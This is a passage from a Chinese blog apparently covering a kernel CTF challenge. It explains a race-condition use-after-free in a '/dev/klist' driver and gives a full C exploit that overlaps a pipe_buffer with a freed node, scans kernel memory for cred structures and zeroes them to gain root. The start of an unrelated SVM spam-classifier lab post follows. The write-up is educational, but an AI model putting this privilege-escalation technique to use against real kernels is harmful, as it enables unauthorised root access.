*/</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>list_head：获取链表头中的内核数据，返回给用户空间</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">list_head</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  item *item; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  mutex_lock(&amp;list_lock); <span class="comment">/* 添加互斥锁 */</span></span><br><span class="line">  get(g_list); </span><br><span class="line">  item = g_list;</span><br><span class="line">  mutex_unlock(&amp;list_lock); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">  v2 = -(__int64)(copy_to_user(addr, item, item-&gt;size + <span class="number">24</span>) != <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  put(g_list); <span class="comment">/* 漏洞点:put在互斥锁外(没有收到保护) */</span></span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>init_module：初始化驱动程序（绑定 “/dev/klist”）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> _register_chrdev(<span class="number">137LL</span>, <span class="number">0LL</span>, <span class="number">256LL</span>, <span class="string">&quot;klist&quot;</span>, &amp;list_fops);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>入侵思路：</p>
<ul>
<li>list_head 函数中的 put 在互斥锁外</li>
<li>add_item 函数中的 refcount 被初始化为“1”</li>
</ul>
<p>假如，在 list_head 函数的 get 操作之后，put 操作之前，另一个线程正好创建了一个新节点，把 g_list 赋值为了这个新节点，接下来 put 操作，将 g_list 的 used 减去“1”后发现为“0”，就会释放这个节点，然后却没有把 g_list 指向下一个节点，这就造成了堆的UAF</p>
<ul>
<li>PS：直接使用 remove_item 会导致目标结点脱链，构不成 UAF，即使生成了 pipe_buffer 也没法控制</li>
</ul>
<p>下面是 init 程序，看一下我们拥有哪些权限：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">➜  rootfs cat init </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -nvt tmpfs none /dev</span><br><span class="line">mknod -m 622 /dev/console c 5 1</span><br><span class="line">mknod -m 666 /dev/null c 1 3</span><br><span class="line">mknod -m 666 /dev/zero c 1 5</span><br><span class="line">mknod -m 666 /dev/ptmx c 5 2</span><br><span class="line">mknod -m 666 /dev/tty c 5 0</span><br><span class="line">mknod -m 0660 /dev/ttyS0 c 4 64</span><br><span class="line">mknod -m 444 /dev/random c 1 8</span><br><span class="line">mknod -m 444 /dev/urandom c 1 9</span><br><span class="line">chown root:tty /dev/console </span><br><span class="line">chown root:tty /dev/ptmx # 没有权限打开/dev/ptmx,获取不了tty_struct</span><br><span class="line">chown root:tty /dev/tty</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"></span><br><span class="line">cat /root/signature</span><br><span class="line"></span><br><span class="line">echo 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line">echo flag&#123;messy_in_kernel&#125; &gt; /flag # 创建flag</span><br><span class="line">chmod 400 /flag</span><br><span class="line">insmod /list.ko</span><br><span class="line">mknod /dev/klist c 137 1</span><br><span class="line">chmod a+rw /dev/klist</span><br><span class="line">cat /proc/kallsyms |grep commit_cred</span><br><span class="line">lsmod</span><br><span class="line"><span class="meta">#</span><span class="bash">cat /sys/module/list/sections/.text</span></span><br><span class="line">setsid cttyhack setuidgid 0 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">halt -d 1 -n -f</span><br></pre></td></tr></table></figure>
<ul>
<li>没有权限去使用 tty_struct attack</li>
<li>但是 ha1vk 大佬有一个巧妙的方法就是利用 pipe 管道，在 pipe 创建管道的时候，会申请这样一个结构：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span> </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span>  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;  </span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure>
<ul>
<li>其中，page 是 pipe 存放数据的缓冲区，offset 和 len 是数据的偏移和长度，一开始，offset 和 len都是“0”，当我们 write(pfd[1],buf,0x100) 的时候，offset = 0，len = 0x100</li>
<li>然而，我们注意到，offset 和 len 都是4字节数据，如果把它们拼在一起，凑成8字节，就是 0x10000000000，如果能够与 list_node 的 size 域对应起来，我们就能溢出堆了</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> item            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x20</span>, mappedto_5)</span><br><span class="line"><span class="number">00000000</span> refcount        dd ?</span><br><span class="line"><span class="number">00000004</span> null            dd ?</span><br><span class="line"><span class="number">00000008</span> size            dq ? <span class="comment">/* item-&gt;size控制着该内核缓冲区的size(将其进行修改) */</span></span><br><span class="line"><span class="number">00000010</span> next            dq ?                    ; offset</span><br><span class="line"><span class="number">00000018</span> data            dq ?</span><br><span class="line"><span class="number">00000020</span> item            ends</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>因此，我们一开始申请一个与 pipe_buffer 大小一样的堆，然后利用竞争释放后，创建一个管道，pipe_buffer 就会申请到这里，接下来再 write(pfd[1],buf,0x100)<ul>
<li>作为管道：它的 pipe_buffer-&gt;offset 变为“0”，pipe_buffer-&gt;len 变为“100”</li>
<li>作为结点：它的 item-&gt;size 变为“0x10000000000”，那么我们就能溢出堆了</li>
</ul>
</li>
</ul>
<p>完整exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_BUFFER_SIZE 0x280 <span class="comment">// pipe_buffer的大小,阅读源码可知</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> fd; <span class="comment">// 驱动的fd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开驱动</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initFD</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   fd = open(<span class="string">&quot;/dev/klist&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-]open file error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 创建节点时需要发送的数据(和驱动程序中的input结构体有关)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span> &#123;</span></span><br><span class="line">   <span class="keyword">size_t</span> size;</span><br><span class="line">   <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addItem</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> <span class="title">data</span>;</span></span><br><span class="line">   data.size = size;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   ioctl(fd,<span class="number">0x1337</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">removeItem</span><span class="params">(<span class="keyword">int64_t</span> index)</span> </span>&#123;</span><br><span class="line">   ioctl(fd,<span class="number">0x1339</span>,index);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">selectItem</span><span class="params">(<span class="keyword">int64_t</span> index)</span> </span>&#123;</span><br><span class="line">   ioctl(fd,<span class="number">0x1338</span>,index);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listHead</span><span class="params">(<span class="keyword">char</span> *buf)</span> </span>&#123;</span><br><span class="line">   ioctl(fd,<span class="number">0x133A</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listRead</span><span class="params">(<span class="keyword">void</span> *buf,<span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">   read(fd,buf,size);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listWrite</span><span class="params">(<span class="keyword">void</span> *buf,<span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">   write(fd,buf,size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否root成功</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">checkWin</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      sleep(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;Rooted in subprocess [%d]\n&quot;</span>,i);</span><br><span class="line">         system(<span class="string">&quot;cat flag&quot;</span>); <span class="comment">// 我们很难getshell</span></span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF_SIZE PIPE_BUFFER_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[BUF_SIZE];</span><br><span class="line"><span class="keyword">char</span> buf2[BUF_SIZE];</span><br><span class="line"><span class="keyword">char</span> bufA[BUF_SIZE];</span><br><span class="line"><span class="keyword">char</span> bufB[BUF_SIZE];</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fillBuf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">memset</span>(bufA,<span class="string">&#x27;a&#x27;</span>,BUF_SIZE);</span><br><span class="line">   <span class="built_in">memset</span>(bufB,<span class="string">&#x27;b&#x27;</span>,BUF_SIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   initFD(); <span class="comment">/* 打开/dev/klist */</span></span><br><span class="line">   fillBuf(); <span class="comment">/* 填充缓冲区 */</span></span><br><span class="line">   addItem(bufA,BUF_SIZE<span class="number">-24</span>); <span class="comment">/* 设置该用户缓冲区与内核缓冲区进行交互 */</span></span><br><span class="line">   selectItem(<span class="number">0</span>); <span class="comment">/* 选择指定位置的节点记录到缓冲区里(遍历整个list_unit链表,获取对应index的item结点) */</span></span><br><span class="line">   <span class="keyword">int</span> pid = fork();</span><br><span class="line">   <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-]fork error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">200</span>;i++) &#123; <span class="comment">// 增加cred结构被分配到堆下方内存的成功率</span></span><br><span class="line">         <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">            checkWin(i+<span class="number">1</span>); <span class="comment">// 子进程结束时,执行checkWin</span></span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>) &#123; <span class="comment">// 与主线程的listHead竞争      </span></span><br><span class="line">          <span class="comment">/* 这里不停地进行&quot;绑定&quot;,&quot;选择&quot;,&quot;删除&quot;,&quot;读取&quot;......</span></span><br><span class="line"><span class="comment">          如果在get操作之后,put操作之前,另一个线程正好创建了一个新节点</span></span><br><span class="line"><span class="comment">          那么该新结点就会被put释放(refcount被put减为&#x27;0&#x27;)</span></span><br><span class="line"><span class="comment">          并且另一个线程还是可以操作该新结点 */</span></span><br><span class="line">          </span><br><span class="line">          <span class="comment">/* &lt;--- 假设上述操作执行成功 ---&gt; */</span></span><br><span class="line">         addItem(bufA,BUF_SIZE<span class="number">-24</span>); <span class="comment">/* 头结点会被替换,并且被put释放,释放之后的内核缓冲区数据发生改变(不再是&#x27;a&#x27;) */</span></span><br><span class="line">         selectItem(<span class="number">0</span>); <span class="comment">/* 选择头结点 */</span></span><br><span class="line">         removeItem(<span class="number">0</span>); <span class="comment">/* 二次释放,没有影响(只有条件竞争没有成功时,这里才有作用) */</span></span><br><span class="line">         addItem(bufB,BUF_SIZE<span class="number">-24</span>); <span class="comment">/* 申请该内核空间为头结点 */</span></span><br><span class="line">         listRead(buf2,BUF_SIZE<span class="number">-24</span>); <span class="comment">/* 把头结点中的数据拷贝到buf2(不再是&#x27;a&#x27;) */</span></span><br><span class="line">         <span class="keyword">if</span> (buf2[<span class="number">0</span>] != <span class="string">&#x27;a&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;race compete in child process!!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         removeItem(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">       </span><br><span class="line">       <span class="comment">/* &lt;--- 条件竞争成功 ---&gt; */</span></span><br><span class="line">      sleep(<span class="number">1</span>); </span><br><span class="line">      removeItem(<span class="number">0</span>); <span class="comment">/* 把空间腾出来 */</span></span><br><span class="line">      <span class="keyword">int</span> pfd[<span class="number">2</span>];</span><br><span class="line">      pipe(pfd); <span class="comment">/* 管道的pipe_buffer将会申请到我们能够UAF控制的空间里 */</span></span><br><span class="line">      write(pfd[<span class="number">1</span>],bufB,BUF_SIZE);</span><br><span class="line">      <span class="keyword">size_t</span> memLen = <span class="number">0x1000000</span>;</span><br><span class="line">      <span class="keyword">uint32_t</span> *data = (<span class="keyword">uint32_t</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>,memLen); <span class="comment">/* 申请缓冲区,用于存储数据 */</span></span><br><span class="line">      listRead(data,memLen); <span class="comment">/* 向data读入&#x27;0x1000000&#x27;字节的内核数据 */</span></span><br><span class="line">      <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">size_t</span> maxLen = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;memLen/<span class="number">4</span>;i++) &#123;</span><br><span class="line">         <span class="keyword">if</span> (data[i] == UID &amp;&amp; data[i+<span class="number">1</span>] == UID &amp;&amp; data[i+<span class="number">7</span>] == UID) &#123;</span><br><span class="line">             <span class="comment">/* 搜索合法的cred,并将其uid-fsgid都修改为&#x27;0&#x27;,使其具有root权限 */</span></span><br><span class="line">            <span class="built_in">memset</span>(data+i,<span class="number">0</span>,<span class="number">28</span>);</span><br><span class="line">            maxLen = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]found cred!!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (count ++ &gt; <span class="number">2</span>) &#123;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      listWrite(data,maxLen * <span class="number">4</span>);</span><br><span class="line">      checkWin(<span class="number">0</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123; <span class="comment">// 主线程</span></span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">         listHead(buf);</span><br><span class="line">         listRead(buf,BUF_SIZE<span class="number">-24</span>);</span><br><span class="line">         <span class="keyword">if</span>(buf[<span class="number">0</span>] != <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>感受了一下条件竞争打法，学到了不少的东西</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/24/Machine-Learning-Lab6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/24/Machine-Learning-Lab6/" class="post-title-link" itemprop="url">Machine-Learning-Lab6</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-05-24 13:43:56 / Modified: 13:45:59" itemprop="dateCreated datePublished" datetime="2022-05-24T13:43:56+08:00">2022-05-24</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/AI/" itemprop="url" rel="index"><span itemprop="name">AI</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>在本练习中，您将使用支持向量机 (SVM) 来构建垃圾邮件分类器</p>
<ul>
<li>ex6.m - 练习前半部分的 Octave/MATLAB 脚本</li>
<li>ex6data1.mat - 示例数据集 1</li>
<li>ex6data2.mat - 示例数据集 2</li>
<li>ex6data3.mat - 示例数据集 3</li>
<li>svmTrain.m - SVM 训练函数</li>
<li>svmPredict.m - SVM 预测函数</li>
<li>plotData.m - 绘制二维数据</li>
<li>visualizeBoundaryLinear.m - 绘制线性边界</li>
<li>visualizeBoundary.m - 绘制非线性边界</li>
<li>linearKernel.m - 支持向量机的线性内核</li>
<li>[?] gaussianKernel.m - 支持向量机的高斯核</li>
<li>[?] dataset3Params.m - 用于 ex6data3.mat 的参数</li>
<li>ex6_spam.m - 练习后半部分的 Octave/MATLAB 脚本</li>
<li>spamTrain.mat - 用“垃圾邮件训练集”进行训练</li>
<li>Test.mat - 垃圾邮件测试集</li>
<li>emailSample1.txt - 示例电子邮件 1</li>
<li>emailSample2.txt - 示例电子邮件 2</li>
<li>spamSample1.txt - 示例电子邮件 3</li>
<li>spamSample2.txt - 示例电子邮件 4</li>
<li>vocab.txt - 词汇表</li>
<li>getVocabList.m - 加载词汇表</li>
<li>porterStemmer.m - 词干功能</li>
<li>readFile.m - 将文件读入字符串</li>
<li>submit.m - 将您的解决方案发送到我们的服务器的提交脚本</li>
<li>[?] processEmail.m - 电子邮件预处理</li>
<li>[?] emailFeatures.m - 从电子邮件中提取特征</li>
</ul>
<p>在整个练习中，您将使用脚本 ex6.m，这些脚本为问题设置数据集并调用您将编写的函数，您只需按照本作业中的说明修改其他文件中的功能</p>
<h2 id="Support-Vector-Machines（支持向量机）"><a href="#Support-Vector-Machines（支持向量机）" class="headerlink" title="Support Vector Machines（支持向量机）"></a>Support Vector Machines（支持向量机）</h2><p>在本练习的前半部分，您将使用支持向量机 (SVM) 和各种示例 2D 数据集，对这些数据集进行试验将帮助您直观地了解 SVM 的工作原理以及如何将高斯核与 SVM 一起使用</p>
<p>在练习的下半部分，您将使用支持向量机来构建垃圾邮件分类器，提供的脚本 ex6.m 将帮助您逐步完成练习的前半部分</p>
<h2 id="Example-Dataset-1（示例数据集-1）"><a href="#Example-Dataset-1（示例数据集-1）" class="headerlink" title="Example Dataset 1（示例数据集 1）"></a>Example Dataset 1（示例数据集 1）</h2><p>我们将从一个可以由线性边界分隔的 2D 示例数据集开始</p>
<ul>
<li>脚本 ex6.m 将绘制训练数据，在这个数据集中，正例（用 + 表示）和负例（用 o 表示）的位置表明了由间隙表示的自然分离</li>
<li>但是，请注意，在最左侧大约 (0.1, 4.1) 处有一个异常正例 +</li>
<li>在下一部分中，您还将看到这个异常值如何影响 SVM 决策边界</li>
</ul>
<p>实现过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">np.set_printoptions(formatter=&#123;<span class="string">&#x27;float&#x27;</span>: <span class="string">&#x27;&#123;: 0.6f&#125;&#x27;</span>.<span class="built_in">format</span>&#125;) <span class="comment"># 用于控制Python中小数的显示精度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ===================== 1.读取数据并可视化 =====================</span></span><br><span class="line">data = scio.loadmat(<span class="string">&#x27;data/ex6data1.mat&#x27;</span>) <span class="comment"># 以字典格式读取数据</span></span><br><span class="line"><span class="comment"># 分别取出特征数据X和对应的输出Y(都是narray格式)</span></span><br><span class="line">X = data[<span class="string">&#x27;X&#x27;</span>]</span><br><span class="line">Y = data[<span class="string">&#x27;y&#x27;</span>].flatten()</span><br><span class="line">plot_data(X,Y) <span class="comment"># 绘制散点图</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Feature 1&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Feature 2&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>绘图：</p>
